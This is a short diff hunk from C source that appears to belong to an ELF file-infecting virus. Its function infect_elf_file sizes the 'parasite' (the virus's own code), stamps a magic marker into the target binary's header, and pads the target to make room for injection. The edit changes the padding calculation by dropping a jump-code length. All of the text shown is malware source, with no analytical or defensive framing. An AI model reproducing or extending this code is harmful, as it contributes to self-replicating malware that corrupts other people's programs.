@@ -404,7 +404,7 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	 * Get size of parasite (self)
 	 */
         parasiteSize = self->size;
-	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
+	paddingSize = PAGE_ALIGN_UP(parasiteSize);
 	
 	mem = target->mem;
 	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
